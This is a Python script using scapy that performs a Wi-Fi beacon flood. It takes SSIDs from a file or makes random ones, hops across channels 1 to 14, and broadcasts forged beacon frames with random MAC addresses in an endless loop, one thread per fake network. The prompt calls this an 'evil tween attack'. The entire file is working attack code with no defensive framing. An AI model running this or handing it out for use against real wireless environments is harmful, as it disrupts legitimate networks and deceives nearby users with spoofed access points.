from scapy.all import *
from threading import Thread
import pandas
import time
import os
import os.path
from os import path
import random
import string
import sys


ssids = []


# Create a random string
# https://pynative.com/python-generate-random-string/
def randomString(stringLength=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

# Parse user inputs.
# Can be a file containing a list of APs (One by line)
# Or a number, generate X networks with random ssids
def parse_params():
	if len(sys.argv) >= 2:
		param = sys.argv[1]

		try:
			with open(param) as my_file:
				for line in my_file:
					ssids.append(line)
		except:
			if param.isdigit():
				for i in range(int(param)):
					ssids.append(randomString())
			else:
				return False
	else:
		return False

	return True







# Parse user inputs and populate ssids
if not parse_params():
	print("This script has one needed parameter\nflood.py <ssid_file|ssid_count>")
	sys.exit(0)


# Let user select network interface to perform attack
while(True): # Emulating do while in python
	ifaces = get_if_list() # Get interfaces in loop in case a new one appears
	iface=input("Name of desired interface to sniff and perform evil tween attack " + str(ifaces) + " : ")

	if(iface in ifaces):
		break


# Hope channel to allow an easier detection by clients
def change_channel():
	ch = 1
	while True:
		os.system(f"iwconfig {iface} channel {ch}")
		# switch channel from 1 to 14 each 0.1s
		ch = ch % 14 + 1
		time.sleep(0.1)


# Advertise an AP 
def advertise_ap(ssid):
	# Create a beacon
	p = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr3=RandMAC()) / Dot11Beacon() / Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
	print(f"\nCreating new network {ssid}")
	#print("Press <ctrl + C> to stop attack")
	sendp(p, inter=0.000000000002, iface=iface, loop=1) # Send packet every 0.5 seconds forever
		
# Start channel hopping thread
# Help for AP detetion by clients
channel_changer = Thread(target=change_channel)
channel_changer.daemon = True
channel_changer.start()



# Run a thread for each ssid
for ssid in ssids:
	
	aa = Thread(target=advertise_ap, args=(ssid,))
	aa.daemon = True
	aa.start()



print("Press <Enter> to stop attack")
input()




